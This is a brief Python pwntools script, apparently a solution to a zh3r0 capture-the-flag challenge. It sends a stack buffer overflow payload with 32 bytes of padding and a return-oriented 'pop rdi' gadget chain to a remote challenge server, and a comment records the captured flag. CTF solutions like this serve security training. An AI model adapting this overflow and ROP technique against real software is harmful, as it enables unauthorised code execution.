from pwn import *

context(log_level='debug')

#p=process('./chall')
p=remote('asia.pwn.zh3r0.ml', 3456)
elf=ELF('./chall')
pop_rdi=0x0000000000400863
win=0x400707
catflag=0x40070B

payload = 'A'*32
payload += p64(pop_rdi)
payload += p64(catflag)


p.recvuntil('Please provide us your name: \n')
p.sendline(payload)
#zh3r0{welcome_to_zh3r0_ctf}

p.interactive()
